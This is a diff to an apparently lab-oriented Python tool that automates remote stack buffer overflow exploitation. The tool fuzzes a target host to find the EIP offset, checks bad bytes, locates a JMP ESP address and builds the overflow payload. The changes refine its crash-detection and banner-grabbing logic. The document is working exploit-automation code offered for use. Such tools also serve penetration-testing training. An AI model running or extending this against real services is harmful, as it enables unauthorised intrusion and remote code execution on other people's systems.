@@ -19,6 +19,7 @@ def main():
 	args = parse_args()
 	print(args)
 	print('='*79)
+	print('!mona config -set workingfolder c:/mona/\%p')
 	target = (args.host, args.port)
 	
 	eip_offset = args.eip_offset
@@ -42,6 +43,8 @@ def main():
 	eip = args.target_eip
 	if not eip:
 		eip = getJmpESPAddr(badbytes, args)
+	else:
+		eip = eip[::-1]
 	buffer = args.prefix + overflow + eip + payload
 	padding = gen_padding(len(buffer) + len(args.postfix), badbytes, args)
 	buffer = buffer + padding + args.postfix
@@ -90,7 +93,7 @@ def check_badbytes(target, badbytes, eip_offset, args):
 		try:
 			connect_and_send(target, buffer, args)
 			# check if crashed
-			if not crashcheck(target):
+			if not crashcheck(target, args):
 				print('Target didn\'t crash.')
 				exit(-1)
 
@@ -314,7 +317,7 @@ def find_eip_offset(target, args):
 			buffer = args.prefix + pattern + args.postfix
 			connect_and_send(target, buffer, args)
 			# check if crashed
-			if crashcheck(target):
+			if crashcheck(target, args):
 				print('Target not responding anymore.')
 				eip = ""
 				while len(eip) != 8:
@@ -329,14 +332,29 @@ def find_eip_offset(target, args):
 	print("Target didn't crash.")
 	exit(-1)
 
-def crashcheck(target):
+def crashcheck(target, args):
+	print('Checking target availibility...')
 	try:
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(5.0)
+		print('Connecting...')
 		s.connect(target)
+		print('Connected...')
+		if args.banner:
+			print(' Checking if can recv banner...')
+			getbanner(s)
+		else:
+			print(' Checking if can send')
+			buffer = args.prefix + b'TEST' + args.postfix
+			s.send(buffer)
+		print('Success, target is up.')
+		print('Disconnecting.')
 		s.close()
+		return False
 	except:
+		print('Error. Assuming target down.')
+		print(sys.exc_info())
 		return True
-	return False
 
 def genPattern(pattern_length, args):
 	pattern = os.popen(f'{args.pattern_generator} {args.pattern_generator_length_flag} {pattern_length}').read()
@@ -380,12 +398,7 @@ def connect_and_send(target, buffer, args):
 	print('Connecting...')
 	s.connect(target)
 	if args.banner:
-		banner = s.recv(1024)
-		length = len(banner)
-		print(f'Got banner, {length} Bytes')
-		print('-' * 12 + ' START ' + '-' * 12)
-		print(banner)
-		print('-' * 13 + ' END ' + '-' * 13)
+		getbanner(s)
 	length = len(buffer)
 	print(f'Sending {length} Bytes.')
 	print('-' * 12 + ' START ' + '-' * 12)
@@ -394,7 +407,16 @@ def connect_and_send(target, buffer, args):
 	s.send(buffer)
 	print('Closing connection.')
 	s.close()
-	time.sleep(0.5)
+	time.sleep(2)
+
+def getbanner(sock):
+	banner = sock.recv(1024)
+	length = len(banner)
+	print(f'Got banner, {length} Bytes')
+	print('-' * 12 + ' START ' + '-' * 12)
+	print(banner)
+	print('-' * 13 + ' END ' + '-' * 13)
+	return banner
 
 def parse_args():
 	parser = argparse.ArgumentParser(description='Automate remote buffer overflows')
